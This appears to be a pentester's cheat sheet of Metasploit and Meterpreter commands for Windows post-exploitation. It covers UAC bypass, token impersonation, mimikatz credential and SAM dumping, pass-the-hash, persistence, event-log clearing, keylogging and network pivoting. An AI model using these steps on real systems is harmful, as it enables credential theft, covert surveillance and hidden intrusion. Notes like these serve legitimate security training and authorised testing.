# Windows Post Exploitation

## Meterpreter Post Exploitation Modules

- `getsystem` will try to get Admin privileges
- `show_mount` will list all USB and drives mounted on the system
- `migrate <PID>` will migrate to another process
- `post/windows/manage/archmigrate` will let meterpreter to migrate and upgradse the actual arch
- `post/windows/manage/migrate` will migrate to another process
- `post/windows/gather/win_privs` will list the actual privileges on the session
- `post/windows/gather/enum_logged_on_users` will list the actual logged users in the system
- `post/windows/gather/checkvm` will check if the target is a virtual machine
- `post/windows/gather/enum_applications` will enumerate the installed applications and versions in the target system
- `post/windows/gather/enum_av_excluded` will list the folders that are excluded from AV scans
- `post/windows/gather/enum_computers` will enumerate other computers of the domain
- `post/windows/gather/enum_patches` will enumerate applied patches on the system
- `post/windows/gather/enum_shares` will list all the shares in the system
- `post/windows/manage/enable_rdp` will enable rdp server

## Bypass UAC

- `search bypassuac` will display all UAC bypasses, all
- `windows/local/bypassuac_injection` module to bypass UAC by using memory injection

## Impersonation tokens with incognito

- `load incognito` will load module to get tokens
- `list_tokens -u` will list available tokens to impersonate
- `impersonate_token <token>` will try to impersonate against a token

## Mimikatz MSF module

- `load kiwi` will load mimikatz
- `creds_all` will display saved credentials
- `lsa_dump_sam` will dump SAM db
- `lsa_dump_secrets` will dump NTLM and syskeys
- `upload <mimikatz_binary>` will upload mimikatz binary
- `privilege::debug` will check if the permissions are correct to perform actions
- `sekurlsa::logonpasswords` will try to get clear text passwords
- `lsadump::sam` will dump SAM db

## Pass The Hash

- `windows/smb/psexec` module works for doing PtH attacks using `SMBPASS` with the user hash will login as the user

## Generating Persistence on Windows

- `search platform:windows persistence` will search for persistence modules.
- `multi/handler` when the persistence module is configured and executed the multi handler is used to reconnect to the target.
- `windows/manage/enable_rdp` module to enable RDP on a target system
- `clearev` this meterpreter module will clear all event logs

## Keylogging

- `keyscan_start` in a meterpretere session to start sniffing the keys
- `keyscan_dump` in a started keyscan to extract the strokes keys
- `keyscan_stop` to stop receiving keystrokes

## Pivoting thought network

- `run autoroute -s <victim_network>` will create a route to the network
- `auxiliary/scanner/portscan/tcp` this module will be usefull to perform network scans to other computers in the same network
- `portfwd add -l <local_port> -p <victim2_port> -r <victim2_ip>` will create a TCP tunnel to access internal services via atacker computer
- `set payload wiwndows/meterpreter/bind_tcp` its important to use bind_tcp payload when pivoting to another machine
